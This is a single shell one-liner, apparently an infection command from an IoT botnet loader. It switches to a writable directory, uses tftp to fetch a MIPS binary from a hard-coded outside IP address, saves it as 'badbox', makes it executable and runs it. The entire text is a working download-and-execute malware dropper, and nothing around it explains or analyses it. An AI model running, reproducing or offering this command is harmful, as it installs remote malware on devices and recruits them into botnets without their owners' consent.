cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 46.166.185.106 -c get y33tmipsel;cat y33tmipsel >badbox;chmod +x *;./badbox
